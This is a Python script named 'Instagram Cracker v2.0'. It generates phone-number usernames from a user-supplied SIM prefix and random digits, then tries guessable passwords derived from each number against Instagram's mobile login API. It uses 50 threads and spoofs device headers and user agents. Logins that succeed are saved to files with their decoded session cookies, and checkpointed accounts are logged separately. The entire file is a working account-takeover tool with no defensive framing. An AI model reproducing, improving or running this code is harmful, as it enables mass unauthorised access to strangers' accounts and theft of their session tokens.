#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
total_attempts = 0
start_time = 0

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()
print_lock = threading.Lock()

# Session pool for speed
session_pool = []
pool_lock = threading.Lock()

def get_pooled_session():
    """Get a session from pool or create new one"""
    with pool_lock:
        if session_pool:
            return session_pool.pop()
    return create_optimized_session()

def return_pooled_session(session):
    """Return session to pool"""
    with pool_lock:
        if len(session_pool) < 15:
            session_pool.append(session)
        else:
            session.close()

def create_optimized_session():
    """Create session with connection pooling"""
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    # Get pooled session
    session = get_pooled_session()
    
    try:
        for pw in password_list:
            # Display progress - optimized (update every 3 attempts)
            with counter_lock:
                loop += 1
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
                
                # Calculate speed
                elapsed = time.time() - start_time
                speed = total_attempts / elapsed if elapsed > 0 else 0
            
            # Only update display every 3 attempts for speed
            if progress % 3 == 0 or progress == 1:
                color = random.choice(colors)
                with print_lock:
                    sys.stdout.write(f"\r{color}[⚡] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m] \033[1;94m{speed:.1f}/s    ")
                    sys.stdout.flush()
            
            # Generate device ID and other required IDs
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
        
            # First hash for username+password
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
        
            # Second hash with salt for device ID
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
        
            # Generate user agent
            useragent = instagram_uaa()
            headers = {
            'host': 'i.instagram.com',
            'x-ig-app-locale': 'in_ID',
            'x-ig-device-locale': 'in_ID',
            'x-ig-mapped-locale': 'id_ID',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
            'x-pigeon-rawclienttime': f'{time.time():.3f}',
            'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            'x-ig-www-claim': '0',
            'x-bloks-is-prism-enabled': 'false',
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': device_id,
            'x-ig-family-device-id': family_device_id,
            'x-ig-android-id': f'android-{android_id_hash}',
            'x-fb-connection-type': 'MOBILE.LTE',
            'x-ig-connection-type': 'MOBILE(LTE)',
            'x-ig-capabilities': '3brTv10=',
            'priority': 'u=3',
            'user-agent': useragent,
            'accept-language': 'id-ID, en-US',
            'x-mid': '',
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
            'x-ig-app-id': '3419628305025917',
            'connection': 'keep-alive'
            }
            # Generate timestamp for password
            timestamp = int(time.time())
        
            # URL encode username and password
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
        
            # Generate encrypted password format
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            # Prepare the encoded data
            params_dict = {
            "client_input_params": {
                "device_id": f"android-{android_id_hash}",
                "login_attempt_count": 1,
                "secure_family_device_id": "",
                "machine_id": "",
                "accounts_list": [],
                "auth_secure_device_id": "",
                "password": encrypted_password,
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 3,
                "event_flow": "login_manual",
                "event_step": "home_page",
                "openid_tokens": {},
                "client_known_key_hash": "",
                "contact_point": encoded_username,
                "encrypted_msisdn": ""
            },
            "server_params": {
                "username_text_input_id": "p5hbnc:46",
                "device_id": f"android-{android_id_hash}",
                "should_trigger_override_login_success_action": 0,
                "server_login_source": "login",
                "waterfall_id": str(uuid.uuid4()),
                "login_source": "Login",
                "INTERNAL__latency_qpl_instance_id": 152086072800150,
                "reg_flow_source": "login_home_native_integration_point",
                "is_platform_login": 0,
                "is_caa_perf_enabled": 0,
                "credential_type": "password",
                "family_device_id": family_device_id,
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "INTERNAL_INFRA_THEME": "harm_f",
                "password_text_input_id": "p5hbnc:47",
                "ar_event_source": "login_home_page"
            }
        }
            # Convert params to JSON string and URL encode
            import json
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
        
            # Prepare the complete encoded string
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        
            # Update content-length in headers
            headers['content-length'] = str(len(encode))
            # login url 
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            # Make API request - using pooled session for speed
            response = session.post(
                url, 
                data=encode, 
                headers=headers, 
                allow_redirects=True,
                timeout=10
            )
            # Check response
            if "logged_in_user" in str(response.text.replace('\\', '')):
                header_str = str(response.headers)
                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1).strip()
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                
                # ✅ FIXED: Removed undefined bkas, username, password, Ok
                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}                    ")
                print("Cookies:", cookies)
                
                # Save to file with fallback
                try:
                    with open("/sdcard/SUMON_INS_IDS.txt","a") as f:
                        f.write(f"{uid}|{pw}|{cookies}\n")
                except:
                    with open("SUMON_INS_IDS.txt","a") as f:
                        f.write(f"{uid}|{pw}|{cookies}\n")
                
                # Use correct list name
                oks.append(uid)
                return_session(session)
                return True
                
            elif 'challenge_required' in response.text:
                   with print_lock:
                       print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}                    ")
                   try:
                       with open("/sdcard/SUMON_INS_CH.txt","a") as f:
                           f.write(uid+"|"+pw+"\n")
                   except:
                       with open("SUMON_INS_CH.txt","a") as f:
                           f.write(uid+"|"+pw+"\n")
                   cps.append(uid)
                   continue
                   
            elif 'checkpoint_required' in response.text:
                   with print_lock:
                       print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}                    ")
                   try:
                       with open("/sdcard/SUMON_INS_CP.txt","a") as f:
                           f.write(uid+"|"+pw+"\n")
                   except:
                       with open("SUMON_INS_CP.txt","a") as f:
                           f.write(uid+"|"+pw+"\n")
                   cps.append(uid)
                   continue
            else:
                # Silent fail for speed
                continue
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(1)  # Reduced from 5 to 1 second
        return False
    except requests.exceptions.RequestException as e:
        return False
    except KeyboardInterrupt:
        raise
    except Exception as e:
        return False
    finally:
        # Always return session to pool
        return_session(session)
    
    return False

def return_session(session):
    """Return session to pool safely"""
    try:
        return_pooled_session(session)
    except:
        pass

def instagram_uaa():
    # Cache common user agents for speed
    common_agents = [
        "Instagram 412.0.0.0.30 Android (31/12; 420dpi; 1080x2400; samsung; SM-G991B; r0q; qcom; en_US; 123456789)",
        "Instagram 413.0.0.0.35 Android (32/13; 440dpi; 1440x3088; samsung; SM-S908E; b0s; qcom; en_US; 987654321)",
        "Instagram 410.0.0.0.28 Android (30/11; 480dpi; 1080x2340; samsung; SM-A536B; a53x; qcom; en_US; 456789123)",
    ]
    
    # Use cached agent 60% of time for speed
    if random.random() < 0.6:
        return random.choice(common_agents)
    
    fb_version = f"{random.randint(400, 450)}.{random.randint(0,0)}.{random.randint(0,0)}.{random.randint(0,0)}.{random.randint(30,99)}"
    android = random.choice(["31/12", "30/11", "32/13"])
    dpi = random.choice(["420dpi", "440dpi", "480dpi", "560dpi"])
    res = random.choice(["1080x2400", "1440x3088", "1080x2340", "1440x3200"])
    models=[("SM-G991B","r0q"),("SM-G996B","t2q"),("SM-G998B","p3q"),("SM-S901E","g0s"),("SM-S906E","g0s2"),("SM-S908E","b0s"),("SM-S911B","dm1q"),("SM-S916B","dm2q"),("SM-S918B","dm3q"),("SM-N986B","c1s"),("SM-N975F","d1x"),("SM-N970F","d1x"),("SM-A135F","a13x"),("SM-A145F","a14x"),("SM-A225F","a22x"),("SM-A235F","a23x"),("SM-A325F","a32x"),("SM-A335F","a33x"),("SM-A415F","a41x"),("SM-A515F","a51x"),("SM-A525F","a52x"),("SM-A536B","a53x"),("SM-A546B","a54x"),("SM-M135F","m13x"),("SM-M236B","m23x"),("SM-M336B","m33x"),("SM-M526B","m52x"),("SM-M536B","m53x"),("SM-F711B","f2q"),("SM-F721B","f4q"),("SM-F926B","f3q"),("SM-F946B","f5q"),("SM-N986B","citrus")]
    lang = random.choice(["en_US","en_GB","hi_IN","id_ID","es_ES"])
    model, code = random.choice(models)
    insta = f"Instagram {fb_version} Android ({android}; {dpi}; {res}; samsung; {model}; {code}; qcom; {lang}; {random.randint(100000000,999999999)})"
    return insta

def generate_random_ids(limit):
    """Generate random 6-digit IDs - optimized"""
    idz.clear()
    # Use random.choices for batch generation speed
    for _ in range(limit):
        random_id = "".join(random.choices(string.digits, k=6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:7],     # First 7 digits
        uid[:8],     # First 8 digits
        uid[4:],     # Last 6 digits
        uid,         # Full number
        uid[2:],     # Remove first 2
        '57273200',  # Static common password
    ]

def random_number():
    """Main random number cloning function"""
    global start_time, total_attempts
    
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
        if limit > 50000:
            print(f" \033[1;93m[!] Limiting to 50000 for performance")
            limit = 50000
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 1000")
        limit = 1000
        time.sleep(1)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
        total_attempts = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Initialize session pool
    with pool_lock:
        session_pool.clear()
        for _ in range(10):
            session_pool.append(create_optimized_session())
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mOptimized: Session Pool + Caching")
    print(f' \033[1;33m[•] \033[1;37mResults saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack - optimized thread count
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result(timeout=30)
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                pass
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.1f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
